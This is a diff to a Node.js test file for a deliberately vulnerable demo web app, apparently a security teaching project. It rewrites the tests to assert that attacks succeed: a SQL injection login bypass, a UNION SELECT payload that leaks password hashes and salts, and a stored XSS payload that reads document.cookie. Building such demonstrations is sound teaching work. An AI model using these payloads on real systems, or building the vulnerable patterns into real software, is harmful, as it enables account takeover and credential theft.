@@ -1,9 +1,11 @@
 'use strict';
 
-// T13 — the NEGATIVE half of the asymmetric suite (SPEC.md §12, §10). The §10 attack payloads are
-// sent as raw HTTP and MUST fail here. The vulnerable twin ships the mirror file asserting the same
-// payloads SUCCEED — a green secure suite and a green vulnerable suite together are the evidence.
-// Fixtures prefixed __test_<runId>_ and removed in after().
+// T18 — the VULNERABLE half of the asymmetric suite (SPEC.md §12, §10). These assert the §10 attack
+// payloads SUCCEED — that is the deliverable's evidence. A red suite here means a vulnerability was
+// accidentally fixed. The mirror file in secure/ asserts the identical payloads FAIL.
+//
+// The stored-XSS *execution* is a browser fact (innerHTML) shown in docs/attack-report.md; here we
+// only prove the payload is stored verbatim, ready to fire at render.
 
 const test = require('node:test');
 const assert = require('node:assert/strict');
@@ -16,7 +18,6 @@ const runId = Date.now().toString(36) + Math.random().toString(36).slice(2, 5);
 const uname = (s) => `__test_${runId}_${s}`;
 const VALID_PW = 'Kq7#mxzptvwR';
 
-// A canary user with a KNOWN password, so a UNION leak of users would be detectable.
 let canary;
 
 test.before(async () => {
@@ -35,32 +36,23 @@ test.after(async () => {
   await pool.end();
 });
 
-test('SC12: SQLi auth-bypass is refused', async () => {
+test('SC9: SQLi auth-bypass SUCCEEDS (the vulnerability being demonstrated)', async () => {
   const res = await request(app).post('/api/login')
     .send({ username: "' OR '1'='1' -- ", password: 'anything' });
-  assert.equal(res.status, 401); // parameterized: the payload matches no username
-  assert.equal(res.body.username, undefined);
+  assert.equal(res.status, 200); // the -- comments out the password_hash check -> logged in
 });
 
-test('SC12: a stacked/OR SQLi in the password field cannot bypass login', async () => {
-  const res = await request(app).post('/api/login')
-    .send({ username: canary.username, password: "' OR '1'='1" });
-  assert.equal(res.status, 401);
-});
-
-test('SC12: a UNION payload in customer search leaks no users columns', async () => {
+test('SC11: a UNION payload leaks users columns through customer search', async () => {
   const payload = "' UNION SELECT id, username, password_hash, salt, 1, 1, 1, NOW() FROM users -- ";
   const res = await canary.agent.get('/api/customers?search=' + encodeURIComponent(payload));
   assert.equal(res.status, 200);
-  assert.ok(Array.isArray(res.body));
 
   const body = JSON.stringify(res.body);
-  assert.doesNotMatch(body, /[0-9a-f]{64}/);          // no 64-hex hash surfaced
-  assert.doesNotMatch(body, /password_hash|"salt"/);   // no users columns
-  assert.ok(!res.body.some((c) => c.name === canary.username)); // no users row leaked as a "customer"
+  assert.match(body, /[0-9a-f]{64}/); // a real password_hash surfaced
+  assert.ok(res.body.some((row) => row.name === canary.username)); // a users row leaked as a "customer"
 });
 
-test('stored XSS payload round-trips byte-identically (stored verbatim, escaped at render)', async () => {
+test('the stored-XSS payload is stored verbatim (renders via innerHTML in the browser — see report)', async () => {
   const name = uname('xss') + '<img src=x onerror="alert(document.cookie)">';
   const created = await canary.agent.post('/api/customers').send({ name });
   assert.equal(created.status, 201);
@@ -68,20 +60,5 @@ test('stored XSS payload round-trips byte-identically (stored verbatim, escaped 
 
   const list = await canary.agent.get('/api/customers');
   const found = list.body.find((c) => c.id === created.body.id);
-  assert.equal(found.name, name); // returned as data; escaping is the client's textContent job
-});
-
-test('SC13: no response leaks a hash, salt, stack frame, or raw SQL error', async () => {
-  const bodies = [];
-  bodies.push((await request(app).post('/api/login')
-    .send({ username: canary.username, password: 'wrongpw' })).text);
-  bodies.push((await request(app).post('/api/login')
-    .send({ username: "' OR '1'='1' -- ", password: 'x' })).text);
-  bodies.push((await request(app).post('/api/register')
-    .send({ username: uname('leakcheck'), email: 'l@ex.com', password: VALID_PW })).text);
-  bodies.push((await canary.agent.get('/api/customers')).text);
-
-  for (const body of bodies) {
-    assert.doesNotMatch(body, /password_hash|"salt"|at Object\.|ER_[A-Z]/);
-  }
+  assert.equal(found.name, name); // verbatim; the vulnerable client writes it with innerHTML
 });
